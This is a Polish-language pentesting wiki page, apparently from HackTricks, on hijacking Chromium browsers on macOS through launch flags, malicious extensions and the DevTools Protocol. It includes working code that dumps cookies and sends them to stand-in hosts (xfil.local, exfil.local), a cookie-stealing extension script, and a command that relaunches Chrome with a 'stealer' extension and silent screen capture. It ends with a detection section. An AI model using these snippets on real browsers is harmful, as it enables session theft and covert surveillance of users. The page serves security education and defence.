# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

Przeglądarki oparte na Chromium, takie jak Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi i Opera, korzystają z tych samych przełączników wiersza poleceń, plików preferencji oraz interfejsów automatyzacji DevTools. W systemie macOS każdy użytkownik z dostępem do GUI może zakończyć istniejącą sesję przeglądarki i ponownie ją uruchomić z dowolnymi flagami, rozszerzeniami lub endpointami DevTools działającymi z uprawnieniami celu.

#### Uruchamianie Chromium z niestandardowymi flagami w systemie macOS

macOS utrzymuje jedną instancję interfejsu użytkownika dla każdego profilu Chromium, dlatego instrumentacja zwykle wymaga wymuszenia zamknięcia przeglądarki (na przykład za pomocą `osascript -e 'tell application "Google Chrome" to quit'`). Atakujący zazwyczaj uruchamiają ją ponownie za pomocą `open -na "Google Chrome" --args <flags>`, aby wstrzyknąć argumenty bez modyfikowania app bundle. Umieszczenie tego polecenia w użytkownikowym LaunchAgent (`~/Library/LaunchAgents/*.plist`) lub hooku logowania gwarantuje, że zmodyfikowana przeglądarka zostanie ponownie uruchomiona po restarcie lub wylogowaniu.

#### Flaga `--load-extension`

Flaga `--load-extension` automatycznie ładuje rozpakowane rozszerzenia (ścieżki rozdzielane przecinkami). Połącz ją z `--disable-extensions-except`, aby zablokować legalne rozszerzenia i wymusić uruchomienie wyłącznie własnego payloadu. Złośliwe rozszerzenia mogą żądać uprawnień o dużym wpływie, takich jak `debugger`, `webRequest` i `cookies`, aby uzyskać dostęp do protokołów DevTools, modyfikować nagłówki CSP, obniżać poziom zabezpieczeń HTTPS lub eksfiltrować dane sesji natychmiast po uruchomieniu przeglądarki.<sup>[[4]](#references)</sup>

#### Flagi `--remote-debugging-port` / `--remote-debugging-pipe`

Przełączniki te udostępniają Chrome DevTools Protocol (CDP) przez TCP lub pipe, dzięki czemu zewnętrzne narzędzia mogą sterować przeglądarką. Google zaobserwowało powszechne wykorzystanie tego interfejsu przez infostealery i począwszy od Chrome 136 (marzec 2025) przełączniki te są ignorowane dla domyślnego profilu, chyba że przeglądarka zostanie uruchomiona z niestandardowym `--user-data-dir`. Wymusza to App-Bound Encryption na rzeczywistych profilach, jednak atakujący nadal mogą uruchomić świeży profil, nakłonić ofiarę do uwierzytelnienia się w jego obrębie (phishing/pomoc w triage) oraz pobrać cookies, tokeny, stany zaufania urządzenia lub rejestracje WebAuthn za pośrednictwem CDP.<sup>[[5]](#references)</sup>

#### Flaga `--user-data-dir`

Flaga ta przekierowuje cały profil przeglądarki (History, Cookies, Login Data, pliki Preference itd.) do ścieżki kontrolowanej przez atakującego. Jest wymagana przy łączeniu współczesnych wersji Chrome z `--remote-debugging-port`, a także utrzymuje zmodyfikowany profil w izolacji, dzięki czemu można umieścić w nim wstępnie przygotowane pliki `Preferences` lub `Secure Preferences`, które wyłączają monity bezpieczeństwa, automatycznie instalują rozszerzenia i zmieniają domyślne schematy.

#### Flaga `--use-fake-ui-for-media-stream`

Przełącznik ten omija monit o uprawnienia do kamery i mikrofonu, dzięki czemu każda strona wywołująca `getUserMedia` natychmiast otrzymuje dostęp. Połącz go z flagami takimi jak `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` lub poleceniami CDP `Browser.grantPermissions`, aby po cichu przechwytywać dźwięk i obraz, udostępniać ekran lub spełniać wymagania uprawnień WebRTC bez interakcji użytkownika.<sup>[[4]](#references)</sup>

## Wzorce dostarczania i ponownego uruchamiania spotykane w praktyce

Nadużywanie CDP jest często etapem **post-exploitation**, a nie początkowym payloadem. W niedawnej kampanii w systemie macOS wymierzonej w developerów wykorzystano zatrutą fazę kompilacji Xcode **`Run Script`** (`PBXShellScriptBuildPhase`), dzięki czemu kod wykonywał się wyłącznie wtedy, gdy ofiara **budowała** projekt, a nie tylko go klonowała lub otwierała. Po pierwszym uruchomieniu malware infekował również inne drzewa `.xcodeproj`, dodawał złośliwe hooki Git `pre-commit` i przeszukiwał archiwa ZIP w poszukiwaniu kolejnych projektów Xcode.<sup>[[3]](#references)</sup>

W przypadku nadużywania Chromium ma to znaczenie, ponieważ atakujący nie musi modyfikować samego browser binary. Krótkotrwały stager build-phase / `osascript` może zamiast tego zainstalować **browser wrapper** (LaunchAgent, login item, wpis w Docku, trojanizowany launcher aplikacji itp.), który za każdym razem ponownie otwiera legalną przeglądarkę z flagami kontrolowanymi przez atakującego, gdy użytkownik ją uruchamia.<sup>[[3]](#references)</sup>

> [!TIP]
> Na endpointach developerów sprawdzaj pliki `.pbxproj`, `.git/hooks/pre-commit` oraz archiwa ZIP zawierające `.xcodeproj` pod kątem nieoczekiwanych poleceń `curl`, `osascript`, `xxd`, zagnieżdżonego `base64` lub logiki ponownego uruchamiania Chrome.

## Zdalne debugowanie i nadużywanie DevTools Protocol

Po ponownym uruchomieniu Chrome z dedykowanymi `--user-data-dir` i `--remote-debugging-port` można podłączyć się przez CDP (np. za pomocą `chrome-remote-interface`, `puppeteer` lub `playwright`) i skryptować workflows o wysokich uprawnieniach:

- **Kradzież cookies/sesji:** `Network.getAllCookies` i `Storage.getCookies` zwracają wartości HttpOnly nawet wtedy, gdy App-Bound encryption normalnie blokowałoby dostęp do systemu plików, ponieważ CDP prosi uruchomioną przeglądarkę o ich odszyfrowanie.
- **Manipulowanie uprawnieniami:** `Browser.grantPermissions` i `Emulation.setGeolocationOverride` pozwalają omijać monity kamery/mikrofonu (szczególnie w połączeniu z `--use-fake-ui-for-media-stream`) lub fałszować kontrole bezpieczeństwa oparte na lokalizacji.
- **Wstrzykiwanie keystrokes/skryptów:** `Runtime.evaluate` wykonuje dowolny JavaScript w aktywnej karcie, umożliwiając kradzież credentials, modyfikowanie DOM lub wstrzykiwanie beaconów persistence, które przetrwają nawigację.<sup>[[1]](#references)</sup>
- **Eksfiltracja na żywo:** `Network.webRequestWillBeSentExtraInfo` i `Fetch.enable` przechwytują uwierzytelnione żądania/odpowiedzi w czasie rzeczywistym, bez dotykania artefaktów na dysku.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Ponieważ Chrome 136 blokuje CDP w domyślnym profilu, skopiowanie istniejącego katalogu `~/Library/Application Support/Google/Chrome` ofiary do ścieżki staging nie zapewnia już odszyfrowanych cookies. Zamiast tego należy podstępnie nakłonić użytkownika do uwierzytelnienia się w instrumentowanym profilu (np. podczas „pomocnej” sesji wsparcia) albo przechwytywać tokeny MFA podczas transmisji za pomocą kontrolowanych przez CDP hooków sieciowych.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

Praktyczny wzorzec malware obejmuje:

1. Ponowne uruchamianie implantu lub wrappera działającego w przestrzeni użytkownika za każdym razem, gdy Chrome zostanie uruchomiony.
2. Uruchomienie legalnej przeglądarki z `--remote-debugging-port=<port>` oraz, w Chrome 136+, zwykle z dodatkowym, niestandardowym `--user-data-dir=<dir>`.
3. Uruchomienie helpera, który łączy się z lokalnym WebSocketem CDP i rejestruje hook przed dokumentem za pomocą `Page.addScriptToEvaluateOnNewDocument`.<sup>[[2]](#references)</sup>

Taki helper może wstrzyknąć JavaScript **przed** uruchomieniem kodu witryny, co idealnie nadaje się do hookowania `window.fetch`, `XMLHttpRequest`, providerów portfeli lub przepływów autofill bez modyfikowania plików na dysku.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Silniejszy wariant zmienia przeglądarkę w **host command bridge**: wstrzyknięty JavaScript emituje `console.log` oznaczony separatorem, lokalny helper monitoruje `Runtime.consoleAPICalled`, usuwa znacznik, wykonuje pozostałą część za pośrednictwem powłoki hosta (na przykład `exec.Command` w Go), a następnie zwraca stdout/stderr przez WebSocket atakującego. Rozszerza to wykonywanie skryptów na poziomie karty do w większości bezplikowego reverse shell.<sup>[[3]](#references)</sup>

## Injection oparte na rozszerzeniu przez Debugger API

Badania z 2023 roku zatytułowane "Chrowned by an Extension" wykazały, że złośliwe rozszerzenie korzystające z API `chrome.debugger` może podłączyć się do dowolnej karty i uzyskać te same uprawnienia DevTools co `--remote-debugging-port`.<sup>[[6]](#references)</sup> Łamie to pierwotne założenia izolacji (rozszerzenia pozostają w swoim kontekście) i umożliwia:

- Cichą kradzież cookies i credentials za pomocą `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modyfikację uprawnień witryn (kamera, mikrofon, geolokalizacja) oraz obejście security interstitial, umożliwiając stronom phishingowym podszywanie się pod okna dialogowe Chrome.
- Manipulowanie ostrzeżeniami TLS, pobieranymi plikami lub promptami WebAuthn przez programowe sterowanie `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` lub `Security.handleCertificateError`.

Załaduj rozszerzenie za pomocą `--load-extension`/`--disable-extensions-except`, aby nie była wymagana żadna interakcja użytkownika. Minimalny background script weaponizujący to API wygląda następująco:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Extension może również subskrybować zdarzenia `Debugger.paused`, aby odczytywać zmienne JavaScript, modyfikować skrypty inline lub dodawać własne breakpointy, które przetrwają nawigację. Ponieważ wszystko działa wewnątrz sesji GUI użytkownika, Gatekeeper i TCC nie są uruchamiane, dzięki czemu technika ta jest idealna dla malware, które uzyskało już wykonanie w kontekście użytkownika.<sup>[[6]](#references)</sup>

## Wykrywanie i hunting

- Generuj alerty dla przeglądarek Chromium uruchomionych z opcjami `--remote-debugging-port`, `--remote-debugging-pipe` lub podejrzaną opcją `--user-data-dir`, szczególnie gdy procesem nadrzędnym jest `bash`, `sh`, `osascript`, `xcodebuild` lub helper LaunchAgent.
- Szukaj krótkich łańcuchów, w których helper otwiera lokalny WebSocket CDP, rejestruje `Page.addScriptToEvaluateOnNewDocument`, a następnie nawiązuje długotrwałe wychodzące połączenie WebSocket/HTTPS.
- Wyszukuj mosty console-to-shell, korelując aktywność przeglądarki `Runtime.consoleAPICalled` z procesami potomnymi lub helperami wykonującymi polecenia dostarczone przez attackera.
- Na Macach deweloperskich sprawdzaj wpisy `PBXShellScriptBuildPhase` w plikach `.pbxproj`, hooki Git `pre-commit`, elementy ponownego uruchamiania Dock/login oraz projekty Xcode zawarte w plikach ZIP pod kątem instalacji wrapperów przeglądarki.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Narzędzia

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatyzuje uruchamianie Chromium z rozszerzeniami zawierającymi payloady i udostępnia interaktywne hooki CDP.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Podobne narzędzie skoncentrowane na przechwytywaniu ruchu i instrumentacji przeglądarki dla operatorów macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Biblioteka Node.js do skryptowania zrzutów Chrome DevTools Protocol (cookies, DOM, uprawnienia), gdy instancja z aktywnym `--remote-debugging-port` jest uruchomiona.

### Przykład
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Znajdź więcej przykładów w links do tools.

## Odnośniki

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
